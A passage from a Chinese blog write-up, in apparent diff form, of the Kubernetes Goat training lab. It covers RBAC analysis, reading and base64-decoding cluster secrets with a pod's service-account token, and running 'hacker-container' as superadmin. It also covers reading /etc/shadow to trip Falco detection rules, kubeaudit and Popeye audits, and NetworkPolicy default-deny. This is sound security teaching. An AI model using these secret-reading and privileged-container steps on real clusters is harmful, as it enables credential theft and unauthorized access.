+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl --cacert <span class="string">&quot;<span class="variable">$&#123;CACERT&#125;</span>&quot;</span> \</span><br><span class="line">  --header <span class="string">&quot;Authorization: Bearer <span class="variable">$&#123;TOKEN&#125;</span>&quot;</span> \</span><br><span class="line">  --header <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -X POST <span class="string">&quot;<span class="variable">$&#123;APISERVER&#125;</span>/api/v1/namespaces/<span class="variable">$&#123;NAMESPACE&#125;</span>/pods&quot;</span> \</span><br><span class="line">  --data-binary @pod.json</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406221819952.png" alt="image-20260406221819952" loading="lazy" decoding="async"></p>
+<p>发现创建失败了，这个是没创建权限的。</p>
+<p>使用api删除Pod。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl --cacert <span class="string">&quot;<span class="variable">$&#123;CACERT&#125;</span>&quot;</span> \</span><br><span class="line">  --header <span class="string">&quot;Authorization: Bearer <span class="variable">$&#123;TOKEN&#125;</span>&quot;</span> \</span><br><span class="line">  -X DELETE <span class="string">&quot;<span class="variable">$&#123;APISERVER&#125;</span>/api/v1/namespaces/<span class="variable">$&#123;NAMESPACE&#125;</span>/pods/my-pod&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406222151023.png" alt="image-20260406222151023" loading="lazy" decoding="async"></p>
+<p>为什么不能创建和删除呢？🤔</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl get rolebinding -n big-monolith -o wide</span><br><span class="line">kubectl get rolebinding -n big-monolith -o json | jq <span class="string">&#x27;.items[] | select(.subjects[]?.name==&quot;big-monolith-sa&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406222925843.png" alt="image-20260406222925843" loading="lazy" decoding="async"></p>
+<p>解释一下上面图片中的字段。</p>
+<ul>
+<li><code>apiVersion</code> / <code>kind</code>：这是 RBAC 的 <code>RoleBinding</code> 资源，版本 <code>rbac.authorization.k8s.io/v1</code>。</li>
+<li><code>metadata</code>：元数据。
+<ul>
+<li><code>name</code> / <code>namespace</code>：这条 RoleBinding 叫 <code>secret-reader-binding</code>，在 <code>big-monolith</code> 命名空间。</li>
+<li><code>creationTimestamp</code> / <code>uid</code> / <code>resourceVersion</code>：创建时间、唯一 ID、用于乐观并发的版本号。</li>
+<li><code>annotations.kubectl.kubernetes.io/last-applied-configuration</code>：<code>kubectl apply</code> 留下的上次应用的配置快照（字符串里是 JSON），方便对比/回滚思路用，授权逻辑不依赖它。</li>
+</ul>
+</li>
+<li><code>roleRef</code>（核心）：不能改指向（Kubernetes 里 RoleBinding 的 <code>roleRef</code> 创建后不可变）。
+<ul>
+<li><code>apiGroup</code>：<code>rbac.authorization.k8s.io</code>。</li>
+<li><code>kind</code>：<code>Role</code>（命名空间作用域的角色）。</li>
+<li><code>name</code>：<code>secret-reader</code>，即实际权限定义在 <code>Role secret-reader</code> 里；要看 verbs，需要再执行：<br>
+<code>kubectl get role secret-reader -n big-monolith -o yaml</code>。</li>
+</ul>
+</li>
+<li><code>subjects</code>：被授予 <code>roleRef</code> 里那个角色的身份列表。
+<ul>
+<li>你这里只有一条：<code>kind: ServiceAccount</code>，<code>name: big-monolith-sa</code>（未写 <code>namespace</code> 时，默认就是 RoleBinding 所在 namespace，即 <code>big-monolith</code>）。<br>
+含义：<code>big-monolith</code> 里的 SA <code>big-monolith-sa</code> 拥有 <code>Role secret-reader</code> 的权限。</li>
+</ul>
+</li>
+</ul>
+<p>发现了这里的<code>roleRef</code>中的name为<code>secret-reader</code>，查看<code>secret-reader</code>的实际权限有什么？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get role secret-reader -n big-monolith -o yaml</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406223646502.png" alt="image-20260406223646502" loading="lazy" decoding="async"></p>
+<p><code>verbs</code>常见的有8种，还有一些特殊的，例如：bind、escalate、approve/ sign等。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">verb</th>
+<th style="text-align:left">大致含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">get</td>
+<td style="text-align:left">读单个资源</td>
+</tr>
+<tr>
+<td style="text-align:left">list</td>
+<td style="text-align:left">列资源列表</td>
+</tr>
+<tr>
+<td style="text-align:left">watch</td>
+<td style="text-align:left">监视变更（流式）</td>
+</tr>
+<tr>
+<td style="text-align:left">create</td>
+<td style="text-align:left">创建（对应 POST）</td>
+</tr>
+<tr>
+<td style="text-align:left">update</td>
+<td style="text-align:left">整体替换（对应 PUT）</td>
+</tr>
+<tr>
+<td style="text-align:left">patch</td>
+<td style="text-align:left">局部更新（对应 PATCH）</td>
+</tr>
+<tr>
+<td style="text-align:left">delete</td>
+<td style="text-align:left">删除单个资源</td>
+</tr>
+<tr>
+<td style="text-align:left">deletecollection</td>
+<td style="text-align:left">按集合条件批量删（对应对 collection 的 DELETE）</td>
+</tr>
+</tbody>
+</table>
+<p>对于特殊的verbs：</p>
+<ul>
+<li><code>bind</code>：把 RoleBinding/ClusterRoleBinding 绑到某 Role/ClusterRole 时用（涉及“绑定”能力）。</li>
+<li><code>escalate</code>：能否获得比自己当前权限更大的角色（与 Role/ClusterRole 相关，防权限提升）。</li>
+<li><code>approve</code> / <code>sign</code> 等：出现在 CSR（证书签名请求） 等特定 API 上，属于该子资源/动作扩展出来的动词。</li>
+</ul>
+<p>若verbs的配置为<code>verbs: [&quot;*&quot;]</code>，表示支持所有的verbs。</p>
+<p>现在再回头看，secret-reader只有get、watch、list，所以这里是不能进行pod的删除和创建的。</p>
+<h4 id="读取密钥信息" tabindex="-1"><a class="headerlink" href="#读取密钥信息" aria-hidden="true"></a> 读取密钥信息</h4>
+<p>从密钥中获取 <code>k8svaulapikey</code> 值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cacert <span class="variable">$&#123;CACERT&#125;</span> --header <span class="string">&quot;Authorization: Bearer <span class="variable">$&#123;TOKEN&#125;</span>&quot;</span> -X GET <span class="variable">$&#123;APISERVER&#125;</span>/api/v1/namespaces/<span class="variable">$&#123;NAMESPACE&#125;</span>/secrets | grep k8svaultapikey </span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406224536465.png" alt="image-20260406224536465" loading="lazy" decoding="async"></p>
+<p>我们可以使用以下命令解码 base64 编码的值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=&quot; | base64 -d</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406224718313.png" alt="image-20260406224718313" loading="lazy" decoding="async"></p>
+<p>拿下flag。</p>
+<h2 id="十六、kubeaudit-audit-kubernetes-clusters" tabindex="-1"><a class="headerlink" href="#十六、kubeaudit-audit-kubernetes-clusters" aria-hidden="true"></a> 十六、KubeAudit - Audit Kubernetes clusters</h2>
+<p>此方案在执行 Kubernetes 安全审计和评估时非常有用。我们将学习如何运行名为 <a target="_blank" rel="noopener" href="https://github.com/Shopify/kubeaudit">kubeaudit</a> 的开源工具来检查 Kubernetes 集群，并利用其结果进一步分析或修复配置错误和漏洞。如果您在当今容器、Kubernetes 和云原生生态系统领域拥有审计和合规方面的背景，那么这至关重要，甚至是必不可少的。</p>
+<p>通过本情景模拟，我们将理解并学习以下内容：</p>
+<ol>
+<li>您将学习如何对 Kubernetes 集群执行 Kubernetes 审计。</li>
+<li>使用开源工具对集群资源进行审计和调查</li>
+<li>全面了解 Kubernetes 集群的安全状况并掌握风险</li>
+</ol>
+<p>工具有点过时了，我看github已经停止更新维护了，这里只是运行体验一下。</p>
+<h3 id="使用kubeaudit扫描排查风险" tabindex="-1"><a class="headerlink" href="#使用kubeaudit扫描排查风险" aria-hidden="true"></a> 使用kubeaudit扫描排查风险</h3>
+<p>此场景的目标是执行 Kubernetes 安全审计并获取审计结果。</p>
+<p>在集群里起 <code>hacker-container</code>，用专用只读 SA。</p>
+<ul>
+<li>建 ServiceAccount</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create serviceaccount kubeaudit -n kube-system</span><br></pre></td></tr></table></figure>
+<ul>
+<li>绑集群只读角色</li>
+</ul>
+<p>先试内置 <code>view</code>（只读，覆盖面大，适合多数清单类审计）:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl create clusterrolebinding kubeaudit-view \</span><br><span class="line">  --clusterrole=view \</span><br><span class="line">  --serviceaccount=kube-system:kubeaudit</span><br></pre></td></tr></table></figure>
+<ul>
+<li>用 <code>kubectl run</code></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kubectl run -n kube-system kubeaudit-shell \</span><br><span class="line">  --<span class="built_in">rm</span> --restart=Never -it \</span><br><span class="line">  --image=madhuakula/hacker-container \</span><br><span class="line">  --overrides=<span class="string">&#x27;&#123;&quot;spec&quot;:&#123;&quot;serviceAccountName&quot;:&quot;kubeaudit&quot;&#125;&#125;&#x27;</span> \</span><br><span class="line">  -- bash</span><br></pre></td></tr></table></figure>
+<p>进入到容器后，直接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubeaudit all</span><br></pre></td></tr></table></figure>
+<p>得到扫描的结果。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406230834877.png" alt="image-20260406230834877" loading="lazy" decoding="async"></p>
+<p>后续就可以根据这个报错的信息，进行深入的利用了。</p>
+<h2 id="十七、falco-runtime-security-monitoring-detection" tabindex="-1"><a class="headerlink" href="#十七、falco-runtime-security-monitoring-detection" aria-hidden="true"></a> 十七、Falco - Runtime security monitoring &amp; detection</h2>
+<p>容器及其基础设施是不可变的。这意味着使用传统工具和技术很难检测到某些攻击、漏洞和安全事件。在本例中，我们将了解如何利用流行的开源工具Falco，通过实际应用规则集来检测并执行运行时安全监控。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/scenario-18-a535e6e5ea439f1e6e68eaaa4d71b4e1.png" alt="scenario-18-a535e6e5ea439f1e6e68eaaa4d71b4e1" loading="lazy" decoding="async"></p>
+<p>通过本情景模拟后，你将理解并学习到以下内容：</p>
+<ol>
+<li>将Helm Chart部署到Kubernetes集群中。</li>
+<li>对Kubernetes集群进行日志分析和安全性事件检测。</li>
+<li>使用Falco近乎实时地分析和检测安全问题。</li>
+</ol>
+<h3 id="使用falco检测异常行为" tabindex="-1"><a class="headerlink" href="#使用falco检测异常行为" aria-hidden="true"></a> 使用Falco检测异常行为</h3>
+<p>使用Helm v3运行以下部署，首先要安装Helm<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>。</p>
+<p>部署Falco Helm Chart。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">helm repo add falcosecurity https://falcosecurity.github.io/charts</span><br><span class="line">helm repo update</span><br><span class="line">helm install falco falcosecurity/falco \</span><br><span class="line">  --<span class="built_in">set</span> falcoctl.artifact.install.enabled=<span class="literal">false</span> \</span><br><span class="line">  --<span class="built_in">set</span> falcoctl.artifact.follow.enabled=<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+<p>这是成功部署了。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260419211953192.png" alt="image-20260419211953192" loading="lazy" decoding="async"></p>
+<ul>
+<li>
+<p><strong>Falco使用系统调用（system calls）来保护和监控系统，具体方式如下：</strong></p>
+<ul>
+<li>在运行时解析来自内核的Linux系统调用。</li>
+<li>对强大的规则引擎进行数据流验证。</li>
+<li>当规则被违反时发出警报。</li>
+</ul>
+</li>
+<li>
+<p><strong>Falco自带一套默认规则，用于检查内核是否存在异常行为，例如：</strong></p>
+<ul>
+<li>利用特权容器进行权限提升。</li>
+<li>使用诸如<code>setns</code>之类的工具更改命名空间。</li>
+<li>对诸如/etc、/usr/bin、/usr/sbin等常用目录进行读/写操作。</li>
+<li>创建符号链接（symlinks）。</li>
+<li>所有权和模式变更（Ownership and Mode changes）。</li>
+<li>意外的网络连接或套接字变更。</li>
+<li>使用<code>execve</code>生成进程。</li>
+<li>执行诸如sh、bash、csh、zsh等shell二进制文件</li>
+<li>执行SSH二进制文件，例如ssh、scp、sftp等。</li>
+<li>修改 Linux coreutils 可执行文件。</li>
+<li>修改登录二进制文件。</li>
+<li>修改 shadowutil 或 passwd 可执行文件，例如 shadowconfig、pwck、chpasswd、getpasswd、change、useradd等。</li>
+</ul>
+<p>运行以下命令，了解有关Falco部署的更多详细信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods -l app.kubernetes.io/name=falco</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260419214535819.png" alt="image-20260419214535819" loading="lazy" decoding="async"></p>
+<p>使用以下命令手动从Falco系统获取日志。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs -f -l app.kubernetes.io/name=falco</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260419214759551.png" alt="image-20260419214759551" loading="lazy" decoding="async"></p>
+<p>现在，我们启动一个hacker container，读取一个敏感文件，看看Falco能否检测到。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run --<span class="built_in">rm</span> --restart=Never -it --image=madhuakula/hacker-container -- bash</span><br></pre></td></tr></table></figure>
+<p>读取敏感文件<code>/etc/shadow</code>。</p>
+<p>然后另一个终端查看日志情况：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs -f -l app.kubernetes.io/name=falco</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260419215907381.png" alt="image-20260419215907381" loading="lazy" decoding="async"></p>
+<p>这里发现告警了，敏感文件被打开了。</p>
+<p>成功实现了风险的监控。</p>
+</li>
+</ul>
+<h2 id="十八、popeye-a-kubernetes-cluster-sanitizer" tabindex="-1"><a class="headerlink" href="#十八、popeye-a-kubernetes-cluster-sanitizer" aria-hidden="true"></a> 十八、Popeye - A Kubernetes cluster sanitizer</h2>
+<p>此场景有助于执行 Kubernetes 安全审计和评估。您将学习如何运行名为 <code>Popeye</code> 开源工具<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>来检查 Kubernetes 集群。您还将利用检查结果进一步分析或修复发现的错误配置和漏洞。如果您拥有在现代容器、Kubernetes 和云原生生态系统中从事审计和合规工作的背景，这将非常重要。</p>
+<p>完成本情景模拟后，您将理解并学习到以下内容：</p>
+<ol>
+<li>你将学习如何对Kubernetes集群执行Kubernetes审计。</li>
+<li>使用开源工具对集群资源进行审计和调查。</li>
+<li>全部了解Kubernetes集群的安全状况并掌握风险。</li>
+</ol>
+<p>通过扫描实时 Kubernetes 集群并报告已部署资源和配置中可能存在的问题，来对 Kubernetes 集群进行审查。</p>
+<h3 id="popeye扫描已部署资源和配置中存在的潜在问题" tabindex="-1"><a class="headerlink" href="#popeye扫描已部署资源和配置中存在的潜在问题" aria-hidden="true"></a> popeye扫描已部署资源和配置中存在的潜在问题</h3>
+<p>以下是一些可供选择的过滤清单</p>
+<ul>
+<li>Node</li>
+<li>Namespace</li>
+<li>Pod</li>
+<li>Service</li>
+<li>ServiceAccount</li>
+<li>Secrets</li>
+<li>ConfigMap</li>
+<li>Deployment</li>
+<li>StatefulSet</li>
+<li>DaemonSet</li>
+<li>PersistentVolume</li>
+<li>PersistentVolumeClaim</li>
+<li>HorizontalPodAutoscaler</li>
+<li>PodDisruptionBudget</li>
+<li>ClusterRole</li>
+<li>ClusterRoleBinding</li>
+<li>Role</li>
+<li>RoleBinding</li>
+<li>Ingress</li>
+<li>NetworkPolicy</li>
+<li>PodSecurityPolicy</li>
+</ul>
+<p>要开始执行此方案，您可以运行以下命令以使用集群管理员权限启动 <code>hacker-container</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl run -n kube-system --<span class="built_in">rm</span> --restart=Never -it --image=madhuakula/hacker-container \</span><br><span class="line">  --overrides=<span class="string">&#x27;&#123;&quot;spec&quot;:&#123;&quot;serviceAccountName&quot;:&quot;superadmin&quot;&#125;&#125;&#x27;</span> -- bash</span><br></pre></td></tr></table></figure>
+<p>使用集群管理员令牌权限在集群中运行 <code>popeye</code>。使用最新版的<code>popeye</code>，hacker-container中自带的版本太老了，无法正常使用了。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260419222557990.png" alt="image-20260419222557990" loading="lazy" decoding="async"></p>
+<h2 id="十九、secure-network-boundaries-using-nsp" tabindex="-1"><a class="headerlink" href="#十九、secure-network-boundaries-using-nsp" aria-hidden="true"></a> 十九、Secure network boundaries using NSP</h2>
+<p>正如您在某些场景中所看到的，Kubernetes 通常采用扁平化的网络架构。这意味着，如果您想要创建网络边界，则需要借助 CNI 创建一种称为网络策略（Network Policy）的东西。在本场景中，我们将探讨一个简单的用例，说明如何创建网络策略来限制流量并在 Kubernetes 资源之间创建网络安全边界。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/scenario-20-67e927c0a31930caec4d269b15e157db.png" alt="scenario-20-67e927c0a31930caec4d269b15e157db" loading="lazy" decoding="async"></p>
+<p>完成本情景模拟后，您将理解并学习到以下内容：</p>
+<ol>
+<li>您将学习如何在 Kubernetes 集群中使用网络策略</li>
+<li>理解并运用基本的 Kubernetes <code>kubectl</code> 命令，并与 Pod 和服务进行交互。</li>
+<li>使用 NSP 创建和销毁 Kubernetes 资源并限制流量</li>
+</ol>
+<p>有关更多示例和网络安全策略的详细说明，可以参考Kubernetes网络策略配方<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup></p>
+<h3 id="network-policy限制网络通信" tabindex="-1"><a class="headerlink" href="#network-policy限制网络通信" aria-hidden="true"></a> Network Policy限制网络通信</h3>
+<p>运行一个带有<code>app=website</code>标签的Nginx容器，并通过80端口将其暴露出来。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run --image=nginx website --labels app=website --expose --port 80</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260419192936572.png" alt="image-20260419192936572" loading="lazy" decoding="async"></p>
+<p>现在，让我们运行一个临时pod，向<code>website</code>服务发送一个简单的HTTP请求。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run --<span class="built_in">rm</span> -it --image=alpine temp -- sh</span><br></pre></td></tr></table></figure>
+<p>然后使用<code>wget</code>向网站服务发送一个简单的HTTP请求。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO- http://website</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260419193113977.png" alt="image-20260419193113977" loading="lazy" decoding="async"></p>
+<p><strong>这里我有一个好奇的点🤔，为什么临时创建的pod可以直接<code>wget -qO- http://website</code>，请求另一个pod中创建的内容？为什么直接<code>http://website</code>的形式就可以访问？这是因为Kubernetes的<code>Service DNS</code>发现机制！</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run --image=nginx website --labels app=website --expose --port 80</span><br></pre></td></tr></table></figure>
+<p><code>--expose</code> 参数会自动创建一个 名为 <code>website</code> 的 Service（与 pod 同名）。输出中也显示了<code>service/website created</code>。</p>
+<p><strong>Kubernetes DNS 解析机制</strong></p>
+<p>在同一个 namespace 内，Kubernetes 会为每个 Service 创建 DNS 记录：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">DNS 格式</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>website</code></td>
+<td style="text-align:left">同 namespace 内可直接使用</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>website.default</code></td>
+<td style="text-align:left">指定 namespace</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>website.default.svc.cluster.local</code></td>
+<td style="text-align:left">完整 FQDN</td>
+</tr>
+</tbody>
+</table>
+<p>所以当你在alpine pod访问<code>http://wesite</code>时：</p>
+<ol>
+<li>DNS解析<code>website</code>→ 得到 Service 的 ClusterIP</li>
+<li>请求被转发到该Service的后端Pod（通过label selector <code>app=website</code>匹配）。</li>
+</ol>
+<p>使用下面的命令可以验证。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl get svc website</span><br><span class="line">kubectl describe svc website</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260419195244819.png" alt="image-20260419195244819" loading="lazy" decoding="async"></p>
+<p>ok，现在了解了pod之间的通信。下面来创建一个网络策略并将其应用到Kubernetes集群，以阻止/拒绝所有请求。</p>
+<p>如下website-deny.yaml</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">NetworkPolicy</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">website-deny</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">podSelector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">website</span></span><br><span class="line">  <span class="attr">ingress:</span> []</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260419200357950.png" alt="image-20260419200357950" loading="lazy" decoding="async"></p>
+<p>这时候再去创建临时的pod去进行访问。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260419201053952.png" alt="image-20260419201053952" loading="lazy" decoding="async"></p>
+<p>这时候就发现流量被阻断了，无法进行访问了。</p>
+<p><strong>为什么这里的website-deny.yaml可以阻断网络的流量🤔？</strong></p>
+<p>这个 NetworkPolicy 能阻断流量的原理是 Kubernetes NetworkPolicy 的默认拒绝机制。</p>
+<p>先看配置文件：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">podSelector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">website</span>      <span class="comment"># 选择目标 Pod</span></span><br><span class="line">  <span class="attr">ingress:</span> []          <span class="comment"># 空的入站规则 = 拒绝所有流量</span></span><br></pre></td></tr></table></figure>
+<p>关键点在于<code>ingress: []</code>，工作机制如下：</p>
+<ol>
+<li><strong>选择目标Pod</strong>：<code>podSelector</code>选中所有带有<code>app=website</code>label的Pod（就是之前创建的nginx pod）</li>
+<li><strong>隔离模式</strong>：一旦Pod被任何NetworkPolicy选中，它就进入了<strong>隔离状态（isolated）</strong>。此时：
+<ul>
+<li>只有被NetworkPolicy<strong>明确允许</strong>的流量才能进入。</li>
+<li>其他所有入栈流量都会被拒绝。</li>
+</ul>
+</li>
+<li><strong>空规则 = 全拒绝：</strong><code>ingress: []</code>表示”没有任何入栈规则被允许“，所以<strong>所有入栈流量都被阻断</strong>。</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">场景</th>
+<th style="text-align:left">行为</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">没有 NetworkPolicy</td>
+<td style="text-align:left">Pod 接受所有流量（默认开放）</td>
+</tr>
+<tr>
+<td style="text-align:left">有 NetworkPolicy 但 ingress 为空</td>
+<td style="text-align:left">拒绝所有入站流量</td>
+</tr>
+<tr>
+<td style="text-align:left">有 NetworkPolicy 并定义了 ingress</td>
+<td style="text-align:left">只允许匹配的流量</td>
+</tr>
+</tbody>
+</table>
+<p>下面是对相关pod、service和策略的删除。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl delete pod website</span><br><span class="line">kubectl delete service website</span><br><span class="line">kubectl delete networkpolicy website-deny</span><br></pre></td></tr></table></figure>
+<h2 id="二十、cilium-tetragon-ebpf-based-security-observability-and-runtime-enforcement" tabindex="-1"><a class="headerlink" href="#二十、cilium-tetragon-ebpf-based-security-observability-and-runtime-enforcement" aria-hidden="true"></a> 二十、Cilium Tetragon - eBPF-based Security Observability and Runtime Enforcement</h2>
+<p>Cilium Tetragon - 基于eBPF的安全可观测性和运行时强制执行。</p>
+<p>容器及其基础设施是不可变的。这意味着使用传统工具和技术很难检测到某些攻击、漏洞和安全事件。本文将介绍如何利用Cilium Tetragon等<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>流行的开源工具，通过 <code>tracingpolicy</code> 的实际应用来检测和执行运行时安全监控。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/scenario-21-f6224cb07df8c572137cd371e26c1d42.png" alt="scenario-21-f6224cb07df8c572137cd371e26c1d42" loading="lazy" decoding="async"></p>
+<p>通过本情景模拟，我们将理解并学习以下内容：</p>
+<ol>
+<li>将 Helm Chart 部署到 Kubernetes 集群中。</li>
+<li>对 Kubernetes 集群进行日志分析和安全性事件检测。</li>
+<li>使用 Cilium Tetragon 近乎实时地使用、分析和检测安全问题。</li>
+</ol>
+<h3 id="cilium-tetragon检测异常行为" tabindex="-1"><a class="headerlink" href="#cilium-tetragon检测异常行为" aria-hidden="true"></a> Cilium Tetragon检测异常行为</h3>
+<p>部署 Cilium Tetragon Helm Chart，运行以下命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">helm repo add cilium https://helm.cilium.io</span><br><span class="line">helm repo update</span><br><span class="line">helm install tetragon cilium/tetragon -n kube-system</span><br></pre></td></tr></table></figure>
+<p>运行以下命令来验证 Tetragon pod 是否处于运行状态</p>
